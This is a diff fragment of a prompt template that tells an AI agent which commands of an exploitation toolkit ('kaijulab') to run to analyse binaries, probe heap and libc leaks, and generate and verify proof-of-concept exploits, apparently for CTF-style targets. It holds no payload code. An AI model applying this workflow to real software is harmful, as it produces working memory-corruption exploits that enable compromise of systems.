 - Use `target/debug/kaijulab api binary-facts --file {binary_q}` first when you need a compact, agent-sized summary of protections, imports, strings, libc offsets, gadgets, and ranked exploit families.
 - Use `target/debug/kaijulab api exploit-scaffold --file {binary_q} --output {output_q}{sysroot_arg}` before writing a PoC from scratch; then edit the generated candidate instead of rebuilding process/qemu plumbing.
 - For heap/menu targets, use `target/debug/kaijulab api heap-probe-plan --file {binary_q}` before guessing primitives, then run synchronized probes with `target/debug/kaijulab api exploit-drive --file {binary_q}{sysroot_arg} --actions '[{{"recv_until":"choice"}},{{"send_line":"4"}},{{"read_for_ms":200}}]' --expect TEXT --timeout-secs 5`.
+- After a heap transcript exists, normalize it into events and run `target/debug/kaijulab api heap-model --file {binary_q} --events '[{{"op":"alloc","id":0,"size":32}},{{"op":"free","id":0}},{{"op":"show","id":0}}]'` before choosing UAF/double-free/overlap hypotheses.
 - For leaks, prefer `target/debug/kaijulab api leak-probe --file {binary_q}{sysroot_arg} --setup @setup.json --cycle @cycle.json --want libc --max-rounds 8` over manual transcript scraping; use it for `/proc/self/maps`, repeated show/read cycles, and raw pointer candidate harvesting.
+- After any libc leak, run `target/debug/kaijulab api libc-resolve --file {binary_q} --leak 0xADDR --symbol SYMBOL` before hardcoding offsets. After proving primitives, run `target/debug/kaijulab api exploit-plan --file {binary_q} --primitive libc-leak --primitive arbitrary-write` to rank finalization paths.
 - Use `target/debug/kaijulab api exploit-context --file {binary_q}` whenever you need refreshed target/runtime/gadget facts.
 - Use `target/debug/kaijulab api exploit-recipe --file {binary_q}` to retrieve only the inferred strategy profile.
 - Use `target/debug/kaijulab api analysis-loop --file {binary_q} --candidate {output_q}` after failed attempts to refresh loop state.
@@ -5295,7 +7111,7 @@ Rules:
 - Do not redirect raw target output to unbounded files. Use `runtime-run --timeout-secs N` or cap file output with `head -c`/`dd count=` before inspection.
 - When one-shot probes are insufficient, use live sessions: `target/debug/kaijulab api debug-session-start`, then `debug-session-action <id> break --address 0xADDR`, `continue`, `stepi`, `registers`, `memory`, `snapshot`, and finally `debug-session-stop <id>`.
 - If stdin can crash/control execution, run `target/debug/kaijulab api crash-offset --file {binary_q}{sysroot_arg}` before hand-computing offsets.
-- Use exact tool syntax: `target/debug/kaijulab api binary-facts --file {binary_q}`; `target/debug/kaijulab api exploit-scaffold --file {binary_q} --output {output_q}{sysroot_arg}`; `target/debug/kaijulab api heap-probe-plan --file {binary_q}`; `target/debug/kaijulab api exploit-drive --file {binary_q}{sysroot_arg} --actions '[{{"recv_until":"choice"}},{{"send_line":"1"}}]' --expect TEXT`; `target/debug/kaijulab api leak-probe --file {binary_q}{sysroot_arg} --cycle '[{{"recv_until":"choice"}},{{"send_line":"2"}},{{"read_for_ms":200}}]' --want pointer`; `target/debug/kaijulab api exploit-kit --file {binary_q}`; `target/debug/kaijulab api ir-query --file {binary_q}`; `target/debug/kaijulab api ir-query --file {binary_q} --function 0xADDR`; `target/debug/kaijulab api ir-query --file {binary_q} --search TEXT`; `target/debug/kaijulab api decompile-enhanced --file {binary_q} 0xADDR`.
+- Use exact tool syntax: `target/debug/kaijulab api binary-facts --file {binary_q}`; `target/debug/kaijulab api exploit-scaffold --file {binary_q} --output {output_q}{sysroot_arg}`; `target/debug/kaijulab api heap-probe-plan --file {binary_q}`; `target/debug/kaijulab api heap-model --file {binary_q} --events '[{{"op":"alloc","id":0,"size":32}},{{"op":"free","id":0}},{{"op":"show","id":0}}]'`; `target/debug/kaijulab api exploit-drive --file {binary_q}{sysroot_arg} --actions '[{{"recv_until":"choice"}},{{"send_line":"1"}}]' --expect TEXT`; `target/debug/kaijulab api leak-probe --file {binary_q}{sysroot_arg} --cycle '[{{"recv_until":"choice"}},{{"send_line":"2"}},{{"read_for_ms":200}}]' --want pointer`; `target/debug/kaijulab api libc-resolve --file {binary_q} --leak 0xADDR --symbol puts`; `target/debug/kaijulab api exploit-plan --file {binary_q} --primitive libc-leak --primitive arbitrary-write`; `target/debug/kaijulab api poc-repair --file {binary_q}{sysroot_arg} {output_q}`; `target/debug/kaijulab api exploit-kit --file {binary_q}`; `target/debug/kaijulab api ir-query --file {binary_q}`; `target/debug/kaijulab api ir-query --file {binary_q} --function 0xADDR`; `target/debug/kaijulab api ir-query --file {binary_q} --search TEXT`; `target/debug/kaijulab api decompile-enhanced --file {binary_q} 0xADDR`.
 - Save important observations with `--save-evidence`, inspect them with `target/debug/kaijulab api evidence-list --file {binary_q}`, and cite evidence IDs in your final status.
 - After every candidate edit, run `target/debug/kaijulab api exploit-verify --save-evidence --file {binary_q}{sysroot_arg} {output_q}` with the right predicate (`--expect-target-exit 42`, `--expect-exit 42`, or `--expect-output MARKER`).
 - If exploit-verify returns success=true, print SCRIPT_READY and stop.
